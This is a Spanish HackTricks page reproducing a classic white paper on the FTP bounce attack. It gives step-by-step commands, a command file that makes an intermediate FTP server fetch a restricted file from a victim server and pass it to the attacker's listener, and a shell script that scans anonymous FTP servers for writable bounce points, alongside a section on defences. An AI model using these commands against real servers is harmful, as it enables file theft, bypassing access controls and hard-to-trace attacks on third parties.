<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una empresa de ciberseguridad? ¬øQuieres ver tu empresa anunciada en HackTricks? ¬øO quieres tener acceso a la √∫ltima versi√≥n de PEASS o descargar HackTricks en PDF? ¬°Consulta los [PLANES DE SUSCRIPCI√ìN](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Resumen

Si tienes acceso a un servidor FTP de rebote, puedes hacer que solicite archivos de otro servidor FTP \(donde conozcas algunas credenciales\) y descargar ese archivo en tu propio servidor.

## Requisitos

Credenciales FTP v√°lidas en el servidor FTP intermedio  
Credenciales FTP v√°lidas en el servidor FTP v√≠ctima  
Ambos servidores aceptan el comando PORT \(ataque de rebote FTP\)  
Puedes escribir dentro de alg√∫n directorio del servidor FTP intermedio  
El servidor intermedio tendr√° m√°s acceso dentro del servidor FTP v√≠ctima que t√∫ por alguna raz√≥n \(esto es lo que vas a explotar\)

## Pasos

1. Con√©ctate a tu propio servidor FTP y haz que la conexi√≥n sea pasiva \(comando pasv\) para que escuche en un directorio donde el servicio v√≠ctima enviar√° el archivo.
2. Crea el archivo que va a enviar el servidor FTP intermedio al servidor v√≠ctima \(el exploit\). Este archivo ser√° un texto plano de los comandos necesarios para autenticarse contra el servidor v√≠ctima, cambiar el directorio y descargar un archivo en tu propio servidor.
3. Con√©ctate al servidor FTP intermedio y sube el archivo anterior.
4. Haz que el servidor FTP intermedio establezca una conexi√≥n con el servidor v√≠ctima y env√≠e el archivo de exploit.
5. Captura el archivo en tu propio servidor FTP.
6. Elimina el archivo de exploit del servidor FTP intermedio.

Toda la informaci√≥n en esta publicaci√≥n se extrajo de: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# El ataque de rebote FTP

Esto discute uno de los muchos posibles usos del "ataque de rebote del servidor FTP". El mecanismo utilizado probablemente es bien conocido, pero hasta la fecha el inter√©s en detallarlo o solucionarlo parece bajo o inexistente. Este ejemplo en particular demuestra otra forma en que la mayor√≠a de las "restricciones de exportaci√≥n" electr√≥nicamente impuestas son completamente in√∫tiles y triviales de eludir. Se elige en un esfuerzo por hacer que el lector se siente y note que hay algunos aspectos realmente mal concebidos del protocolo FTP est√°ndar.

Gracias tambi√©n a Alain Knaff en imag.fr por una discusi√≥n breve pero entretenida de algunos de estos problemas hace un par de meses que me hizo pensar m√°s profundamente sobre ellos.

## El motivo

Eres un usuario en foreign.fr, direcci√≥n IP F.F.F.F, y quieres recuperar el c√≥digo fuente criptogr√°fico de crypto.com en los Estados Unidos. El servidor FTP en crypto.com est√° configurado para permitir tu conexi√≥n, pero denegar el acceso a las fuentes criptogr√°ficas porque tu direcci√≥n IP de origen es la de un sitio no estadounidense \[seg√∫n lo cerca que su servidor FTP pueda determinar a partir del DNS, eso es\]. En cualquier caso, no puedes recuperar directamente lo que quieres del servidor de crypto.com.

Sin embargo, crypto.com permitir√° que ufred.edu descargue fuentes criptogr√°ficas porque ufred.edu tambi√©n est√° en los Estados Unidos. Sabes que /incoming en ufred.edu es un directorio de escritura mundial que cualquier usuario an√≥nimo puede dejar archivos y leerlos de vuelta. La direcci√≥n IP de crypto.com es C.C.C.C.

## El ataque

Esto asume que tienes un servidor FTP que hace modo pasivo. Abre una conexi√≥n FTP a la direcci√≥n IP real de tu propia m√°quina \[no localhost\] e inicia sesi√≥n. Cambia a un directorio conveniente al que tengas acceso de escritura, y luego haz:
```text
pasv
stor foobar
```
Tome nota de la direcci√≥n y el puerto que se devuelven del comando PASV, F,F,F,F,X,X. Esta sesi√≥n FTP se quedar√° colgada, as√≠ que p√°sela a segundo plano o cambie a otra ventana o algo para continuar con el resto de esto.

Construya un archivo que contenga comandos del servidor FTP. Llam√©moslo "`instrs`". Se ver√° as√≠:
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
F,F,F,F,X,X es la misma direcci√≥n y puerto que tu propia m√°quina te entreg√≥ en la primera conexi√≥n. La basura al final son l√≠neas adicionales que creas, cada una conteniendo 250 NULLS y nada m√°s, suficiente para llenar alrededor de 60K de datos adicionales. La raz√≥n de este relleno se explica m√°s adelante.

Abre una conexi√≥n FTP a ufred.edu, inicia sesi√≥n de forma an√≥nima y cambia al directorio /incoming. Ahora escribe lo siguiente en esta sesi√≥n FTP, lo que transferir√° una copia de tu archivo "`instrs`" y luego le dir√° al servidor FTP de ufred.edu que se conecte al servidor FTP de crypto.com usando tu archivo como comandos:
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` deber√≠a aparecer ahora como "`foobar`" en tu m√°quina a trav√©s de tu primera conexi√≥n FTP. Si la conexi√≥n a ufred.edu no se cerr√≥ por s√≠ sola debido a un error com√∫n del servidor, limpia borrando "`instrs`" y saliendo. De lo contrario, tendr√°s que volver a conectarte para terminar.

## Discusi√≥n

Existen varias variantes de esto. Tu conexi√≥n de escucha PASV se puede abrir en cualquier m√°quina a la que tengas acceso de escritura de archivos, ya sea la tuya, otra conexi√≥n a ufred.edu o en alg√∫n lugar completamente diferente. De hecho, ni siquiera tiene que ser un servidor FTP, cualquier utilidad que escuche en un puerto TCP conocido y lea datos en bruto de √©l en un archivo servir√°. Una conexi√≥n de datos FTP en modo pasivo es simplemente una forma conveniente de hacer esto.

Los nulos adicionales al final del archivo de comandos son para llenar las ventanas TCP en ambos extremos de la conexi√≥n ufred -&gt; crypto, y asegurarse de que la conexi√≥n de comando permanezca abierta el tiempo suficiente para que se ejecute toda la sesi√≥n. De lo contrario, la mayor√≠a de los servidores FTP tienden a abortar todas las transferencias y el procesamiento de comandos cuando la conexi√≥n de control se cierra prematuramente. El tama√±o de los datos es suficiente para llenar tanto las ventanas de recepci√≥n como de transmisi√≥n, que en algunos sistemas operativos son bastante grandes \[del orden de 30K\]. Puedes reducir esto si sabes qu√© sistemas operativos hay en ambos extremos y la suma de sus tama√±os de ventana TCP predeterminados. Est√° dividido en l√≠neas de 250 caracteres para evitar sobrecargar los b√∫feres de comandos en el servidor objetivo, probablemente acad√©mico ya que le dijiste al servidor que saliera.

Si crypto.com no permite \*ninguna\* conexi√≥n de cliente FTP desde ti en foreign.fr y necesitas ver qu√© archivos hay donde, siempre puedes poner "`list -aR`" en tu archivo de comandos y obtener una lista de directorios de todo el √°rbol a trav√©s de ufred.

Es posible que tengas que recuperar tu archivo de comandos en el servidor FTP de destino en modo ASCII en lugar de modo binario. Algunos servidores FTP pueden manejar nuevas l√≠neas en bruto, pero otros pueden necesitar que las l√≠neas de comando se terminen con pares CRLF. Ten esto en cuenta al recuperar archivos para demonios que no sean servidores FTP.

## Otras posibilidades

A pesar de que estas conexiones de terceros son de un solo sentido, se pueden utilizar para todo tipo de cosas. Se pueden utilizar m√©todos similares para enviar correo y noticias virtualmente indetectables, atacar servidores en varios sitios, llenar discos, intentar saltar cortafuegos y, en general, ser molesto y dif√≠cil de rastrear al mismo tiempo. Un poco de reflexi√≥n traer√° la realizaci√≥n de numerosas otras posibilidades aterradoras.

Las conexiones lanzadas de esta manera provienen del puerto fuente 20, que algunos sitios permiten a trav√©s de sus cortafuegos en un esfuerzo por lidiar con el problema "ftp-data". Para algunos prop√≥sitos, esto puede ser lo siguiente mejor a los ataques con enrutamiento de origen y es probable que tenga √©xito donde el enrutamiento de origen falla contra los filtros de paquetes. Y todo esto es posible gracias a la forma en que se escribi√≥ la especificaci√≥n del protocolo FTP, permitiendo que las conexiones de control vengan de cualquier lugar y las conexiones de datos vayan a cualquier lugar.

## Defensas

Siempre habr√° sitios en la red con servidores FTP antiguos y directorios escribibles que permiten este tipo de tr√°fico, por lo que decir "arregla todos los servidores FTP" es la respuesta equivocada. Pero puedes proteger el tuyo contra ser un punto de rebote de terceros y que se use otro contra ti.

Lo primero obvio que puedes hacer es permitir que un servidor FTP solo haga conexiones de datos al mismo host desde el que se origin√≥ la conexi√≥n de control. Esto no evita el ataque anterior, por supuesto, ya que el oyente PASV podr√≠a estar f√°cilmente en ufred.edu y, por lo tanto, cumplir con ese requisito, pero evita que tu sitio sea un posible punto de rebote. Tambi√©n rompe el concepto de "FTP proxy", pero en alg√∫n lugar oculto en este p√°rrafo hay un viol√≠n muy peque√±o.

Lo siguiente obvio es prohibir las conexiones de control de FTP que provengan de puertos reservados, o al menos del puerto 20. Esto evita el escenario anterior tal como se indica.

Ambas cosas, adem√°s de la caca habitual sobre bloquear paquetes con enrutamiento de origen y otras v√≠as de suplantaci√≥n, son necesarias para evitar hacks de este tipo. Y piensa si realmente necesitas un directorio "entrante" abierto.

Solo permitir conexiones de datos de clientes en modo pasivo es otra posibilidad, pero todav√≠a hay demasiados clientes FTP en uso que no son conscientes del modo pasivo.

## "Un consenso suelto y c√≥digo en ejecuci√≥n"

Hay algunos trabajos existentes que abordan esto disponible aqu√≠ en avian.org \[y ha estado disponible durante varios meses, debo agregar\] en el "[archivo de correcciones](ftp://ftp.avian.org:/src/fixkits/)". Se presentan varias modificaciones a wu-ftpd-2.4, que incluyen c√≥digo para prevenir y registrar intentos de usar comandos PORT falsos. Tambi√©n se incluyen correcciones de seguridad recientes de otros lugares, junto con soporte s/key y varias opciones de tiempo de compilaci√≥n para mejorar la seguridad de aplicaciones espec√≠ficas.

Stan Barber en academ.com est√° trabajando en la fusi√≥n de estas y varias otras correcciones en una verdadera versi√≥n actualizada de wu-ftpd. Hay un par de otros esfuerzos divergentes en marcha. En ning√∫n lugar se afirma que todo este trabajo est√© completo todav√≠a, pero es un comienzo hacia algo que he tenido en mente durante un tiempo: una versi√≥n de wu-ftpd-2.5 para toda la red, con contribuciones de todo el mundo. El servidor wu-ftpd se ha vuelto muy popular, pero necesita otra actualizaci√≥n de seguridad. Ser√≠a bueno reunir todas las mejoras en un solo lugar coordinado, y parece que suceder√°. Todo esto a√∫n no ayudar√° a las personas que insisten en ejecutar servidores suministrados por el proveedor, por supuesto.

La comprobaci√≥n de la fuente del puerto de conexi√≥n del cliente no se implementa espec√≠ficamente en las correcciones del servidor FTP, sino en las modificaciones del paquete tcp-wrappers de Wietse, ya que este problema es m√°s general. Se agrega una opci√≥n PORT simple que niega las conexiones de rangos configurables de puertos fuente en la etapa tcpd, antes de que se ejecute un demonio llamado.

Algunas de estas correcciones se se√±alan en [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) en el √°rea FTP an√≥nima aqu√≠. Lee esta hoja de ruta antes de tomar otras cosas.

## Notas

Agregar los nulos al final del archivo de comandos fue la clave para hacer que esto funcionara contra una variedad de demonios. Simplemente enviar los datos deseados generalmente fallar√≠a debido al cierre inmediato que indica al demonio que abandone.

Si WUSTL no ha renunciado por completo al proyecto wu-ftpd, est√°n guardando silencio sobre un trabajo adicional. Bryan O'Connor parece tener muchos otros proyectos a los que atender en este momento...

Este es un script trivial para encontrar directorios y archivos de propiedad de escritura mundial en un servidor FTP an√≥nimo basado en Unix. Te sorprender√° cu√°ntos de esos "puntos de rebote" escribibles aparecen despu√©s de una breve ejecuci√≥n de algo as√≠. M√°s tarde tendr√°s que comprobar que puedes poner y obtener archivos de esos lugares; algunos servidores protegen los archivos cargados contra la lectura. Muchos no lo hacen, y luego se preguntan por qu√© est√°n entre los diez mejores sitios de warez de esta semana...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
  BEGIN { idir = "/" ; dirp = 0 }
  /.:$/ { idir = $0 ; dirp = 1 ; }
  /^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
    if (dirp == 1) print idir
    dirp = 0
    print $0
  } '
rm xxx.$$
```
Supongo que se podr√≠a llamar a esto un libro blanco. Est√° disponible en avian.org en [/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack) y tambi√©n se ha publicado en varios lugares relevantes. \_H\* 950712



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
